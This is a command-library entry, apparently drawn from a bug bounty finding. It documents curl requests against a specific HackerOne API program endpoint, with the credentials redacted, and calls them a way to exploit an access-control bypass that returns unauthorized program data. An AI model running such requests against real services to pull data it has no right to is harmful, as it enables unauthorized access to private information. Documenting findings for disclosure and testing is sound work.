---
id: cmd-001
data: >-
  curl "https://api.hackerone.com/v1/hackers/programs/askcmsakmdfksqa_h1b/" -X
  GET -u "██████=" -H 'Accept: application/json'
tags:
  - api-query
  - http-get
  - hackerone
type: command
output: JSON response containing unauthorized program data
executor: bash
platforms:
  - Linux
  - macOS
  - Windows
created_at: '2024-10-01T00:00:00Z'
updated_at: '2025-12-14T17:30:47.288Z'
verified: false
validated: true
submitted: true
---
# curl-hackerone-api-query

## Command

```bash
curl "https://api.hackerone.com/v1/hackers/programs/askcmsakmdfksqa_h1b/" -X GET -u "██████=" -H 'Accept: application/json'
```

## Description

This command performs a GET request to the HackerOne API to retrieve details for a specific program handle, using basic authentication with an API key. It is used to test and exploit access control bypasses by querying unauthorized resources.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `-X GET` | Specifies the HTTP method as GET | Yes |
| `-u "██████="` | Provides basic auth with the API key as username (password empty) | Yes |
| `-H 'Accept: application/json'` | Sets the response format to JSON | Yes |
| URL | The API endpoint with program handle | Yes |

## Examples

### Basic Usage

```bash
curl "https://api.hackerone.com/v1/hackers/programs/askcmsakmdfksqa_h1b/" -X GET -u "██████=" -H 'Accept: application/json'
```

### Advanced Usage

```bash
curl "https://api.hackerone.com/v1/hackers/programs/askcmsakmdfksqa_h1b/updates" -X GET -u "██████=" -H 'Accept: application/json' -o updates.json
```

## Expected Output

A JSON object or array with program policy, updates, or details, including fields like 'name', 'policy', and 'handle' for the queried program, indicating successful unauthorized access if data is returned.

## Related

- [[Related Procedure: Query-Unauthorized-Program-Policy-via-API]]
